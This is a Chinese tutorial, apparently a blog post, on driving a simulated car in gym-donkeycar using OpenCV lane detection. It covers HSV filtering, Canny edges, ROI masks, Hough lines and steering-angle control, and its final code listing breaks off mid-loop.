###1.3自动驾驶初体验 这个模拟器的好处就在于预留了Python控制接口，我们只需要安装一个驱动库就可以直接驱动模拟器里面的小车运行（提前安装好Git工具）： 在pycharm下方终端输入以下pip命令 1pip install git+https://github.com/tawnkramer/gym-donkeycar 安装好以后我们可以运行下面的python代码来实现小车的控制（注意：运行下面的代码前先启动模拟器，并停留在模拟器对应地图里） ： 1234567891011121314151617181920212223242526# 导入库import gymimport gym_donkeycarimport numpy as npimport cv2 # 设置模拟器环境env = gym.make(&quot;donkey-generated-roads-v0&quot;) # 重置当前场景obv = env.reset() # 运行100帧for t in range(100): # 定义控制动作 action = np.array([0.3,0.5]) # 动作控制，0.3表示转向，0.5表示油门 # 执行动作 obv, reward, done, info = env.step(action) # 取一张图像保存 if t == 20: img = cv2.cvtColor(obv,cv2.COLOR_RGB2BGR) cv2.imwrite(&#x27;test.jpg&#x27;,img) # 运行完以后重置当前场景obv = env.reset() 我们先分析下这段代码。下面这行代码用于设置模拟器环境，简单来说就是启用哪张地图： 1env = gym.make(&quot;donkey-generated-roads-v0&quot;) 在这个模拟器里面我们可以用到的地图如下所示： “donkey-warehouse-v0” “donkey-generated-roads-v0” “donkey-avc-sparkfun-v0” “donkey-generated-track-v0” “donkey-roboracingleague-track-v0” “donkey-waveshare-v0” “donkey-minimonaco-track-v0” “donkey-warren-track-v0” “donkey-thunderhill-track-v0” “donkey-circuit-launch-track-v0” 接下来的代码里面，我们运行了100帧，每帧都用固定的控制参数来执行：右转0.3、前进0.5。这两个字段就是我们前面提到的转向和油门值。下面给出这两个值的具体定义： 油门值取值范围是[-1，1]，负值代表倒退，正值代表前进。转向值取值范围也是[-1，1]，负值代表向左，正值代表向右。 接下来使用np.array封装这两个参数，然后通过env.step来执行单步动作。执行完动作以后会返回一些信息，其中我们需要重点关注obs这个返回参数，这个参数表示当前位于小车正中间行车记录仪摄像头返回的一帧图像 ，图像宽160像素，高120像素，3通道RGB图像。可以在代码根目录下找到test.jpg文件查看。 numpy教程十分钟入门 openCV教程 黑马程序员 建议观看以上视频，学习一定的基础知识。当然没有这样的知识硬记语法也是可以的。 2.基于OpenCV的自动驾驶控制在学习自动驾驶前，我们先看看传统算法是怎么解决自动驾驶任务的。本节为后续自动驾驶作铺垫，如果不感兴趣可以直接跳转到深度学习部分。 我们希望通过算法来控制小车，最终让这个小车稳定运行在行车道内。这里面涉及到两方面：感知和动作规划。感知部分我们主要通过行道线检测来实现，动作规划通过操控转向角度来实现。行道线检测的目的就是希望能够根据检测到的行道线位置来计算最终应该转向的角度，从而控制小车始终运行在当前车道线内。 由于道路环境比较简单，针对我们这个任务，我们进一步简化我们的控制变量，我们只控制转向角度，对于油门值我们在运行时保持低匀速，这样我们的重点就可以放在一个变量上面—转向角度。 2.1基于HSV空间的特定颜色区域提取 颜色过滤是目前经常被使用到的图像处理技巧之一，例如天气预报抠像等，经常会使用绿幕作为背景进行抠图。本小节使用颜色过滤来初步提取出行道线。 从模拟平台的图像数据上进行分析，小车左侧是黄实线，右侧是白实线。我们希望小车一直运行在这两根线之间。因此，我们首先要定位出这两根线。我们可以通过颜色空间变换来定位这两根线。 为了方便将黄色线和白色线从图像中过滤出来，我们需要将图像从RGB空间转换到HSV空间再处理。 这里首先我们解释下RGB和HSV颜色空间的区别。 RGB 是我们接触最多的颜色空间，由三个通道表示一幅图像，分别为红色(R)，绿色(G)和蓝色(B)。这三种颜色的不同组合可以形成几乎所有的其他颜色。RGB 颜色空间是图像处理中最基本、最常用、面向硬件的颜色空间，比较容易理解。RGB 颜色空间利用三个颜色分量的线性组合来表示颜色，任何颜色都与这三个分量有关，而且这三个分量是高度相关的，所以连续变换颜色时并不直观，想对图像的颜色进行调整需要更改这三个分量才行。自然环境下获取的图像容易受自然光照、遮挡和阴影等情况的影响，即对亮度比较敏感。而 RGB 颜色空间的三个分量都与亮度密切相关，即只要亮度改变，三个分量都会随之相应地改变，而没有一种更直观的方式来表达。但是人眼对于这三种颜色分量的敏感程度是不一样的，在单色中，人眼对红色最不敏感，蓝色最敏感，所以 RGB 颜色空间是一种均匀性较差的颜色空间。如果颜色的相似性直接用欧氏距离来度量，其结果与人眼视觉会有较大的偏差。对于某一种颜色，我们很难推测出较为精确的三个分量数值来表示。所以，RGB 颜色空间适合于显示系统，却并不适合于图像处理。 基于上述理由，在图像处理中使用较多的是 HSV 颜色空间，它比 RGB 更接近人们对彩色的感知经验。非常直观地表达颜色的色调、鲜艳程度和明暗程度，方便进行颜色的对比。在 HSV 颜色空间下，比 BGR 更容易跟踪某种颜色的物体，常用于分割指定颜色的物体。HSV 表达彩色图像的方式由三个部分组成： Hue（色调、色相） Saturation（饱和度、色彩纯净度） Value（明度） 其中Hue用角度度量，取值范围为0～360°，表示色彩信息，即所处的光谱颜色的位置，如下图所示。 如果我们想要过滤出黄色线，那么我们就可以将色调范围控制在[30~ 90]之间即可。注意：在OpenCV中色调范围是[0~ 180]，因此上述黄色范围需要缩小1倍，即[15~ 45]。检测白色行道线也是采用类似的原理。 RGB转化到HSV的算法(c++): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051float retmax(float a,float b,float c)//求最大值&#123; float max = 0; max = a; if(max&lt;b) max = b; if(max&lt;c) max = c; return max;&#125;float retmin(float a,float b,float c)//求最小值&#123; float min = 0; min = a; if(min&gt;b) min = b; if(min&gt;c) min = c; return min;&#125;//R,G,B参数传入范围（0~100）//转换结果h(0~360),s(0~100),v(0~100)void rgb_to_hsv(float *h,float *s,float *v,float R,float G,float B)&#123; float max = 0,min = 0; R = R/100; G = G/100; B = B/100; max = retmax(R,G,B); min = retmin(R,G,B); *v = max; if(max == 0) *s = 0; else *s = 1 - (min/max); if(max == min) *h = 0; else if(max == R &amp;&amp; G&gt;=B) *h = 60*((G-B)/(max-min)); else if(max == R &amp;&amp; G&lt;B) *h = 60*((G-B)/(max-min)) + 360; else if(max == G) *h = 60*((B-R)/(max-min)) + 120; else if(max == B) *h = 60*((R-G)/(max-min)) + 240; *v = *v * 100; *s = *s * 100;&#125; HSV转RGB算法：(c++) 123456789101112131415161718192021222324252627282930313233//参数入参范围h(0~360),s(0~100),v(0~100),这里要注意，要把s,v缩放到0~1之间//转换结果R(0~100),G(0~100),B(0~100)，如需转换到0~255，只需把后面的乘100改成乘255void hsv_to_rgb(int h,int s,int v,float *R,float *G,float *B)&#123; float C = 0,X = 0,Y = 0,Z = 0; int i=0; float H=(float)(h); float S=(float)(s)/100.0; float V=(float)(v)/100.0; if(S == 0) *R = *G = *B = V; else &#123; H = H/60; i = (int)H; C = H - i; X = V * (1 - S); Y = V * (1 - S*C); Z = V * (1 - S*(1-C)); switch(i)&#123; case 0 : *R = V; *G = Z; *B = X; break; case 1 : *R = Y; *G = V; *B = X; break; case 2 : *R = X; *G = V; *B = Z; break; case 3 : *R = X; *G = Y; *B = V; break; case 4 : *R = Z; *G = X; *B = V; break; case 5 : *R = V; *G = X; *B = Y; break; &#125; &#125; *R = *R *100; *G = *G *100; *B = *B *100;&#125; 而以上方法在opencv中都有封装，仅需要一句代码即可实现。现在我们来检测黄色线与白色线。 代码实现： 123456789101112131415161718import cv2import numpy as np #读取图像并转换到HSV空间frame = cv2.imread(&#x27;test.jpg&#x27;)hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV) # 黄色线检测lower_blue = np.array([15, 40, 40])upper_blue = np.array([45, 255, 255])yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)cv2.imwrite(&#x27;yellow_mask.jpg&#x27;,yellow_mask) # 白色线检测lower_blue = np.array([0, 0, 200])upper_blue = np.array([180, 30, 255])white_mask = cv2.inRange(hsv, lower_blue, upper_blue)cv2.imwrite(&#x27;white_mask.jpg&#x27;,white_mask) 运行效果如下图： 可以看到还有很大的干扰存在。主要来自于相似的颜色，因此我们还需要进行进一步的处理。 2.2基于canny算子的边缘轮廓提取 目前我们仅获得了行道线区域，为了后续能够方便的计算行道线角度，我们需要得到行道线具体的轮廓&#x2F;线段信息，即从区域中提取出线段。这里我们使用Canny算法实现。 Canny边缘检测是从不同视觉对象中提取有用的结构信息并大大减少要处理的数据量的一种技术，于1986年被提出，目前已广泛应用于各种计算机视觉系统。 Canny算法具体包括5个步骤： 使用高斯滤波器，以平滑图像，滤除噪声。 计算图像中每个像素点的梯度强度和方向。 应用非极大值（Non-Maximum Suppression）抑制，以消除边缘检测带来的杂散响应。 应用双阈值（Double-Threshold）检测来确定真实的和潜在的边缘。 通过抑制孤立的弱边缘最终完成边缘检测。 具体实现细节我们不再详细剖析，在OpenCV中集成了canny算法，只需要一行代码即可实现canny边缘检测。 1234567# 黄色线边缘提取yellow_edge = cv2.Canny(yellow_mask, 200, 400)cv2.imwrite(&#x27;yellow_edge.jpg&#x27;, yellow_edge) # 白色线边缘提取whitewhite_edge = cv2.Canny(white_mask, 200, 400)cv2.imwrite(&#x27;white_edge.jpg&#x27;, white_edge) 有兴趣了解canny的同学可以查看这篇博客 ,其中运用到的正态分布、偏导、梯度与极限的知识我们都学过，可以理解。高斯核滤波也用于卷积，而实际上的卷积还会复杂一点，可以自行了解。在后面的pytorch版本我会详细解释运行原理。 代码中200和400这两个参数表示canny算子的低、高阈值，按照opencv教程一般可以不用修改。 最终效果： 2.3感兴趣区域(ROI)定位在利用OpenCV对图像进行处理时，通常会遇到一个情况，就是只需要对部分感兴趣区域（Region Of Interest, ROI）进行处理。例如针对我们这个模拟平台上的智能小车任务来说，对于黄色行道线，我们只关注图像右下部分，而对于白色行道线，我们只关注图像左下部分即可。至于图像其他部分因为我们通过人工分析知道，这些区域我们并不需要处理。因此，我们只用提取图像的对应区域。 1234567891011121314151617181920212223242526272829303132import cv2import numpy as npdef region_of_interest(edges, color=&#x27;yellow&#x27;): &#x27;&#x27;&#x27; 感兴趣区域提取 &#x27;&#x27;&#x27; height, width, _ = edges.shape mask = np.zeros_like(edges) # 定义感兴趣区域掩码轮廓 if color == &#x27;yellow&#x27;: polygon = np.array([[(width * 1 / 2, height * 1 / 2), (width, height * 1 / 2), (width, height), (width * 1 / 2, height)]], np.int32) else: polygon = np.array([[(0, height * 1 / 2), (width * 1 / 2, height * 1 / 2), (width * 1 / 2, height), (0, height)]], np.int32) # 填充感兴趣区域掩码 cv2.fillPoly(mask, polygon, (255,255,255)) # 提取感兴趣区域 croped_edge = cv2.bitwise_and(edges, mask) return croped_edgeif __name__==&quot;__main__&quot;: yimg = cv2.imread(&#x27;yellow_edge.jpg&#x27;) wimg = cv2.imread(&#x27;white_edge.jpg&#x27;) cv2.imwrite(&#x27;white_edge_new.jpg&#x27;, region_of_interest(wimg, &#x27;white&#x27;)) cv2.imwrite(&#x27;yellow_edge_new.jpg&#x27;, region_of_interest(yimg)) 这里定义感兴趣区域、填充感兴趣区域是使用了暴力的直接定位法，按住ctrl+函数名可以进入cv2.fillPoly查看函数的参数与具体作用。在实际应用中我们还有一些更加高级的方法来锁定感兴趣区域，但对于模拟器而言这种方法已经够用。注意这一段代码： 12345&#x27;&#x27;&#x27; 感兴趣区域提取 &#x27;&#x27;&#x27; height, width, _ = edges.shape mask = np.zeros_like(edges) edges.shape返回有三个参数，分别为高度、宽度、通道数，如rgb图像就是三通道的。但是下面我们用不到通道数的值，但解包赋值需要把返回值全部接受，因此此处用_ 暂时存放通道数。 对于如何填充矩形有兴趣的同学，可以查看这篇博客 。这里进行部分的转载。 一、fillConvexPoly( )函数以填充矩形为例我图中想填充以1、2、3、4为顶点的矩形，我就要按1、2、3、4的顺序给出坐标序列array，或者是连贯的相邻顶点顺序（比如1432，4321…） 12rectangular = np.array([ [0,0],[0,740], [4032,740], [4032,0] ])cv2.fillConvexPoly(img_gray, rectangular, (0,0,0)) 效果如下图所示 那如果不按邻边顺序，如果我写成1423会如何呢？来看。 emmm， 我觉得想画五角星的画可以这样。 二、fillPoly( )函数好了，上面都是基本操作，看看官方教程都可以。我们玩点别的。我如果想把一个矩形区域留住（拿车牌举例），剩下的填充为白色应该怎么办呢？举一反三一下，两种办法：（1） 1cv2.fillPoly(img_gray, [rec1, rec2, rec3, rec4], (255,255,255)) 四个矩形，改用fillPoly（）方法。 结果如上图。 （2）非要死脑筋其实用fillConvexPoly( )也不是不可以。 画个示意图，你们懂我意思吧。 定位后，我们的图片如下所示，可以看到更加“整洁”了。 ###2.4基于霍夫变换的线段检测 到目前，我们抽取出了比较精确的行道线轮廓，但是对于实际的自动驾驶任务来说还没有完成目标任务要求，我们要对行道线轮廓再进一步处理，得到行道线的具体线段信息（每条线段的起始点坐标）。本小节我们使用霍夫变换来完成这个任务。霍夫变换，英文名称Hough Transform，作用是用来检测图像中的直线或者圆等几何图形的。 具体的，一条直线的表示方法有好多种，最常见的是y&#x3D;mx+b的形式。结合我们这个任务，对于最终检测出的感兴趣区域，怎么把图片中的直线提取出来。基本的思考流程是：如果直线 y&#x3D;mx+b 在图片中，那么图片中，必需有N多点在直线上（像素点代入表达式成立），只要有这条直线上的两个点，就能确定这条直线。该问题可以转换为：求解所有的(m,b)组合。【以下是部分原理，不感兴趣的同学可以直接跳到代码】 设置两个坐标系，左边的坐标系表示的是(x,y)值，右边的坐标系表达的是(m,b)的值，即直线的参数值。那么一个(x,y)点在右边对应的就是一条线，左边坐标系的一条直线就是右边坐标系中的一个点。这样，右边左边系中的交点就表示有多个点经过(k,b)确定的直线。但是，该方法存在一个问题，(m,b)的取值范围太大。 为了解决(m,b)取值范围过大的问题，在直线的表示方面用 xcosθ+ysinθ&#x3D;r 的规范式代替一般表达式，参数空间变成(θ,r)，0&#x3D;&lt;θ&lt;&#x3D;2PI。这样图像空间中的一个像素点在参数空间中就是一条曲线（三角函数曲线）。 此时，图像空间和参数空间的对应关系如下： 从图中可以看出，霍夫直线检测即为在参数空间中对r和theta投票的过程，得票最高者为最终的直线参数。 theta表示与直线垂直的线与x轴的夹角，那么他的取值范围就是-pi到pi ，但显然取0-pi就可以表示所有直线。 更详细的数学原理请查看这篇博客 ，其中涉及到笛卡尔坐标向极坐标变换(事实上是一个特殊的参数空间)的讨论，对数学感兴趣的同学可以深入了解，这里不再展示。走到这一步，流程图如下所示。 霍夫线段检测算法原理步骤如下： 初始化(θ,r)空间，N(θ,r)&#x3D;0 。（N(θ,r)表示在该参数表示的直线上的像素点的个数） 对于每一个像素点(x,y)，在参数空间中找出令 xcosθ+ysinθ&#x3D;r 的(θ,r)坐标，N(θ,r)+&#x3D;1 统计所有N(θ,r)的大小，取出N(θ,r)&gt;threasold的参数 。（threadsold是预设的阈值） OpenCV中封装好了基于霍夫变换的直线检测方法HoughLinesP，下面我们就来使用它进行线段检测。 123456789101112131415def detect_line(edges): &#x27;&#x27;&#x27; 基于霍夫变换的直线检测 &#x27;&#x27;&#x27; rho = 1 # 距离精度：1像素 angle = np.pi / 180 #角度精度：1度 min_thr = 10 #最少投票数 lines = cv2.HoughLinesP(edges, rho, angle, min_thr, np.array([]), minLineLength=8, maxLineGap=8) return lines 我们可以print一下lines，结果如下(此处仅作展示，后面有这一步的完整代码) 123456789101112131415161718192021[[[ 1 94 47 62]] [[143 94 156 103]] [[103 67 119 77]] [[ 1 86 41 60]] [[101 52 158 56]] [[104 69 159 100]] [[ 5 52 22 53]] [[129 63 140 63]] [[ 87 50 110 52]] [[ 0 88 17 77]] [[ 88 55 134 89]] [[ 2 94 36 70]] [[ 17 50 29 50]] [[ 23 73 42 60]] [[ 90 56 110 70]] [[ 1 56 16 51]] [[128 55 148 56]] [[ 0 89 8 84]] [[ 88 56 112 75]] [[151 101 159 104]] [[ 30 73 43 61]]] 返回的每组值都是一条线段表示线段起始位置(x_start,y_start,x_end,y_end)。可以看到小线段很多，我们对这些小线段做一下聚类和平均： 123456789101112131415161718192021222324252627def average_lines(frame, lines, direction=&#x27;left&#x27;): &#x27;&#x27;&#x27; 小线段聚类 &#x27;&#x27;&#x27; lane_lines = [] if lines is None: print(direction + &#x27;没有检测到线段&#x27;) return lane_lines height, width, _ = frame.shape fits = [] for line in lines: for x1, y1, x2, y2 in line: if x1 == x2: continue # 计算拟合直线 fit = np.polyfit((x1, x2), (y1, y2), 1) slope = fit[0] intercept = fit[1] if direction == &#x27;left&#x27; and slope &lt; 0: fits.append((slope, intercept)) elif direction == &#x27;right&#x27; and slope &gt; 0: fits.append((slope, intercept)) if len(fits) &gt; 0: fit_average = np.average(fits, axis=0) lane_lines.append(make_points(frame, fit_average)) return lane_lines 这里需要注意，由于图像的y坐标跟我们数学上经常遇到的y坐标方向是相反的（图像的y坐标轴正向是朝下的），因此，左侧黄色实线斜率是负值，右侧白色实线斜率是正值。上述代码我们将所有小线段的斜率和截距进行了平均，并且使用make_points函数重新计算了该平均线对应到图像上的起始坐标位置，make_points函数如下所示： 1234567891011def make_points(frame, line): &#x27;&#x27;&#x27; 根据直线斜率和截距计算线段起始坐标 &#x27;&#x27;&#x27; height, width, _ = frame.shape slope, intercept = line y1 = height y2 = int(y1 * 1 / 2) x1 = max(-width, min(2 * width, int((y1 - intercept) / slope))) x2 = max(-width, min(2 * width, int((y2 - intercept) / slope))) return [[x1, y1, x2, y2]] 上述函数最后返回的是坐标数值，这样看线段的坐标值不是很直观，我们可以写个脚本显式的观察这些线段： 1234567891011def display_line(frame, lines, line_color=(0, 0, 255), line_width=2): &#x27;&#x27;&#x27; 在原图上展示线段 &#x27;&#x27;&#x27; line_img = np.zeros_like(frame) if lines is not None: for line in lines: for x1, y1, x2, y2 in line: cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width) line_img = cv2.addWeighted(frame, 0.8, line_img, 1, 1) return line_img 上述代码我们将行道线按照一定权重与原图进行合成，方便我们查看最终效果。 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import cv2import numpy as npdef detect_line(edges): &#x27;&#x27;&#x27; 基于霍夫变换的直线检测 &#x27;&#x27;&#x27; rho = 1 # 距离精度：1像素 angle = np.pi / 180 # 角度精度：1度 min_thr = 10 # 最少投票数 lines = cv2.HoughLinesP(edges,rho, angle,min_thr,np.array([]),minLineLength=8,maxLineGap=8) return linesdef average_lines(frame, lines, direction=&#x27;left&#x27;): &#x27;&#x27;&#x27; 小线段聚类 &#x27;&#x27;&#x27; lane_lines = [] if lines is None: print(direction + &#x27;没有检测到线段&#x27;) return lane_lines #height, width , _= frame.shape fits = [] for line in lines: for x1, y1, x2, y2 in line: if x1 == x2: continue # 计算拟合直线 fit = np.polyfit((x1, x2), (y1, y2), 1) slope = fit[0] intercept = fit[1] if direction == &#x27;left&#x27; and slope &lt; 0: fits.append((slope, intercept)) elif direction == &#x27;right&#x27; and slope &gt; 0: fits.append((slope, intercept)) if len(fits) &gt; 0: fit_average = np.average(fits, axis=0) lane_lines.append(make_points(frame, fit_average)) return lane_linesdef make_points(frame, line): &#x27;&#x27;&#x27; 根据直线斜率和截距计算线段起始坐标 &#x27;&#x27;&#x27; height, width= frame.shape slope, intercept = line y1 = height y2 = int(y1 * 1 / 2) x1 = max(-width, min(2 * width, int((y1 - intercept) / slope))) x2 = max(-width, min(2 * width, int((y2 - intercept) / slope))) return [[x1, y1, x2, y2]]def display_line(frame, lines, line_color=(0,0,255), line_width=2): &#x27;&#x27;&#x27; 在原图上展示线段 &#x27;&#x27;&#x27; line_img = np.zeros_like(frame) if lines is not None: for line in lines: for x1, y1, x2, y2 in line: cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width) line_img = cv2.addWeighted(frame, 0.8, line_img, 1, 1) return line_imgdef main(): yimg = cv2.imread(&#x27;yellow_edge_new.jpg&#x27;,0) wimg = cv2.imread(&#x27;white_edge_new.jpg&#x27;,0) #霍夫变换 yimg_detect_line = detect_line(yimg) wimg_detect_line = detect_line(wimg) #小线段聚类 yimg_average_lines = average_lines(yimg,yimg_detect_line,direction=&#x27;right&#x27;) wimg_average_lines = average_lines(wimg,wimg_detect_line) #在原图上展示线段 y=cv2.imread(&#x27;test.jpg&#x27;) w=cv2.imread(&#x27;test.jpg&#x27;) yellow_display_line = display_line(y, yimg_average_lines) white_display_line = display_line(w, wimg_average_lines) cv2.imwrite(&#x27;yellow_display_line.jpg&#x27;, yellow_display_line) cv2.imwrite(&#x27;white_display_line.jpg&#x27;, white_display_line)if __name__==&quot;__main__&quot;: #函数入口 main() 我们来分析一下几段容易出错的代码： 123if len(fits) &gt; 0: fit_average = np.average(fits, axis=0) lane_lines.append(make_points(frame, fit_average)) 注意此处已经嵌套调用了make_points函数，返回了图片的x，y坐标。后续不需要再进行make_points，否则将会出现传入参数错误。 123def main(): yimg = cv2.imread(&#x27;yellow_edge_new.jpg&#x27;,0) wimg = cv2.imread(&#x27;white_edge_new.jpg&#x27;,0) 这里imread后面多带一个参数0，表示以单通道读入。即使图像显示为黑白，它仍然可能是三通道的，而yimg_detect_line中HoughLinesP霍夫变换只接受单通道的图片。这里不加0这个参数将会出现错误。 1234def display_line(frame, lines, line_color=(0,0,255), line_width=2): &#x27;&#x27;&#x27; 在原图上展示线段 &#x27;&#x27;&#x27; 注意line_color传入的rgb三色值是倒过来的，实际上红色对应的是(255，0，0)，而(0， 0， 255)是紫蓝色(?) 1height, width= frame.shape 某些.shape返回的是三个参数，第三个表示的是通道数。一般用_ 来接收这个不需要用到的通道数，而此处不会返回这个值，所以加入_ 会出错。实际应该根据编译器的提示进行修改(因为我也没摸透为什么，可能图片经过其他函数的一些转换后，不会返回这个参数。实际上修改起来也比较简单。) 1234567#在原图上展示线段 y=cv2.imread(&#x27;test.jpg&#x27;) w=cv2.imread(&#x27;test.jpg&#x27;) yellow_display_line = display_line(y, yimg_average_lines) white_display_line = display_line(w, wimg_average_lines) cv2.imwrite(&#x27;yellow_display_line.jpg&#x27;, yellow_display_line) cv2.imwrite(&#x27;white_display_line.jpg&#x27;, white_display_line) 这里读入我们拍摄的彩色图片，将红色的线段合成上去。整体代码运行结果如下： 从效果上看我们准确的将两条行道线检测了出来。接下来就是根据这两条行道线进行自动驾驶方向控制。 2.5动作控制：转向角针对前面的测试图片，我们可以有效的检测出两条行道线（左侧黄色线和右侧白色线），但是在真实的运行过程中，可能会出现3种情况： (1)正常检测到2条行道线：这种情况一般是直线车道且车辆稳定运行在行道线内，这时候我们只需要根据检测出的两条行道线微调整角度即可。 (2)检测出1条行道线：这种情况在转弯处容易出现，或者在车辆开始大范围偏离时出现，这时候我们的策略应该是向能够检测到的这条行道线方向前进。 (3)检测不到行道线：这种情况应该停下小车。 因此，针对三种情况我们需要不同的处理方式。代码如下所示： 12345678910111213141516171819202122232425# 计算转向角x_offset = 0y_offset = 0if len(yellow_lane)&gt;0 and len(white_lane)&gt;0: # 检测到2条线 _, _, left_x2, _ = yellow_lane[0][0] _, _, right_x2, _ = white_lane[0][0] mid = int(width / 2) x_offset = (left_x2 + right_x2) / 2 - mid y_offset = int(height / 2)elif len(yellow_lane)&gt;0 and len(yellow_lane[0])==1: # 只检测到黄色行道线 x1, _, x2, _ = yellow_lane[0][0] x_offset = x2 - x1 y_offset = int(height / 2)elif len(white_lane)&gt;0 and len(white_lane[0])==1: # 只检测到白色行道线 x1, _, x2, _ = white_lane[0][0] x_offset = x2 - x1 y_offset = int(height / 2)else: # 一条线都没检测到 print(&#x27;检测不到行道线，退出程序&#x27;) break angle_to_mid_radian = math.atan(x_offset / y_offset) angle_to_mid_deg = int(angle_to_mid_radian * 180.0 / math.pi) steering_angle = angle_to_mid_deg/45.0action = np.array([steering_angle, 0.3]) # 油门值恒定 到这里我们就可以开始启动程序了。完整代码如下所示： 先编写自定义库tools： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110import cv2import numpy as npdef detect_line(edges): &#x27;&#x27;&#x27; 基于霍夫变换的直线检测 &#x27;&#x27;&#x27; rho = 1 # 距离精度：1像素 angle = np.pi / 180 # 角度精度：1度 min_thr = 10 # 最少投票数 lines = cv2.HoughLinesP(edges,rho, angle,min_thr,np.array([]),minLineLength=8,maxLineGap=8) return linesdef average_lines(frame, lines, direction=&#x27;left&#x27;): &#x27;&#x27;&#x27; 小线段聚类 &#x27;&#x27;&#x27; lane_lines = [] if lines is None: print(direction + &#x27;没有检测到线段&#x27;) return lane_lines #height, width , _= frame.shape fits = [] for line in lines: for x1, y1, x2, y2 in line: if x1 == x2: continue # 计算拟合直线 fit = np.polyfit((x1, x2), (y1, y2), 1) slope = fit[0] intercept = fit[1] if direction == &#x27;left&#x27; and slope &lt; 0: fits.append((slope, intercept)) elif direction == &#x27;right&#x27; and slope &gt; 0: fits.append((slope, intercept)) if len(fits) &gt; 0: fit_average = np.average(fits, axis=0) lane_lines.append(make_points(frame, fit_average)) return lane_linesdef make_points(frame, line): &#x27;&#x27;&#x27; 根据直线斜率和截距计算线段起始坐标 &#x27;&#x27;&#x27; height, width, _ = frame.shape slope, intercept = line y1 = height y2 = int(y1 * 1 / 2) x1 = max(-width, min(2 * width, int((y1 - intercept) / slope))) x2 = max(-width, min(2 * width, int((y2 - intercept) / slope))) return [[x1, y1, x2, y2]]def display_line(frame, lines, line_color=(0,0,255), line_width=2): &#x27;&#x27;&#x27; 在原图上展示线段 &#x27;&#x27;&#x27; line_img = np.zeros_like(frame) if lines is not None: for line in lines: for x1, y1, x2, y2 in line: cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width) line_img = cv2.addWeighted(frame, 0.8, line_img, 1, 1) return line_imgdef main(): yimg = cv2.imread(&#x27;yellow_edge_new.jpg&#x27;,0) wimg = cv2.imread(&#x27;white_edge_new.jpg&#x27;,0) #霍夫变换 yimg_detect_line = detect_line(yimg) wimg_detect_line = detect_line(wimg) #小线段聚类 yimg_average_lines = average_lines(yimg,yimg_detect_line,direction=&#x27;right&#x27;) wimg_average_lines = average_lines(wimg,wimg_detect_line) #在原图上展示线段 y=cv2.imread(&#x27;test.jpg&#x27;) w=cv2.imread(&#x27;test.jpg&#x27;) yellow_display_line = display_line(y, yimg_average_lines) white_display_line = display_line(w, wimg_average_lines) cv2.imwrite(&#x27;yellow_display_line.jpg&#x27;, yellow_display_line) cv2.imwrite(&#x27;white_display_line.jpg&#x27;, white_display_line)def region_of_interest(edges, color=&#x27;yellow&#x27;): &#x27;&#x27;&#x27; 感兴趣区域提取 &#x27;&#x27;&#x27; height, width = edges.shape mask = np.zeros_like(edges) # 定义感兴趣区域掩码轮廓 if color == &#x27;yellow&#x27;: polygon = np.array([[(width * 1 / 2, height * 1 / 2), (width, height * 1 / 2), (width, height), (width * 1 / 2, height)]], np.int32) else: polygon = np.array([[(0, height * 1 / 2), (width * 1 / 2, height * 1 / 2), (width * 1 / 2, height), (0, height)]], np.int32) # 填充感兴趣区域掩码 cv2.fillPoly(mask, polygon, (255, 255, 255)) # 提取感兴趣区域 croped_edge = cv2.bitwise_and(edges, mask) return croped_edge 再编写主函数入口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109# 导入系统库import cv2import numpy as npimport mathimport gymimport gym_donkeycar# 导入自定义库from tools import region_of_interest, detect_line, make_points, average_lines, display_linedef main(): &#x27;&#x27;&#x27; 主函数 &#x27;&#x27;&#x27; # 设置模拟器环境 env = gym.make(&quot;donkey-generated-roads-v0&quot;) # 重置当前场景 obv = env.reset() # 开始启动 action = np.array([0, 1]) # 动作控制，第1个转向值，第2个油门值 # 执行动作 obv, reward, done, info = env.step(action) # 获取图像 frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR) # 运行1000次动作 for t in range(1000): # 转换图像到HSV空间 height, width, _ = frame.shape hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV) # 黄色区域检测 lower_blue = np.array([15, 40, 40]) upper_blue = np.array([45, 255, 255]) yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue) # 白色区域检测 lower_blue = np.array([0, 0, 200]) upper_blue = np.array([180, 30, 255]) white_mask = cv2.inRange(hsv, lower_blue, upper_blue) # 黄色线边缘提取 yellow_edge = cv2.Canny(yellow_mask, 200, 400) # 白色线边缘提取 white_edge = cv2.Canny(white_mask, 200, 400) # 黄色线感兴趣区域提取 yellow_roi = region_of_interest(yellow_edge, color=&#x27;yellow&#x27;) # 白色线感兴趣区域提取 white_roi = region_of_interest(white_edge, color=&#x27;white&#x27;) # 黄色线段检测 yellow_lines = detect_line(yellow_roi) yellow_lane = average_lines(frame, yellow_lines, direction=&#x27;right&#x27;) # yellow_show = display_line(frame, yellow_lane) # 白色线段检测 white_lines = detect_line(white_roi) white_lane = average_lines(frame, white_lines, direction=&#x27;left&#x27;) # white_show = display_line(frame, white_lane, line_color=(255, 0, 0)) # 计算转向角 x_offset = 0 y_offset = 0 if len(yellow_lane) &gt; 0 and len(white_lane) &gt; 0: # 检测到2条线 _, _, left_x2, _ = yellow_lane[0][0] _, _, right_x2, _ = white_lane[0][0] mid = int(width / 2) x_offset = (left_x2 + right_x2) / 2 - mid y_offset = int(height / 2) elif len(yellow_lane) &gt; 0 and len(yellow_lane[0]) == 1: # 只检测到黄色行道线 x1, _, x2, _ = yellow_lane[0][0] x_offset = x2 - x1 y_offset = int(height / 2) elif len(white_lane) &gt; 0 and len(white_lane[0]) == 1: # 只检测到白色行道线 x1, _, x2, _ = white_lane[0][0] x_offset = x2 - x1 y_offset = int(height / 2) else: # 一条线都没检测到 print(&#x27;检测不到行道线，退出程序&#x27;) break angle_to_mid_radian = math.atan(x_offset / y_offset) angle_to_mid_deg = int(angle_to_mid_radian * 180.0 / math.pi) steering_angle = angle_to_mid_deg / 45.0 action = np.array([steering_angle, 0.3]) # 油门值恒定 # 执行动作 obv, reward, done, info = env.step(action) # 重新获取图像 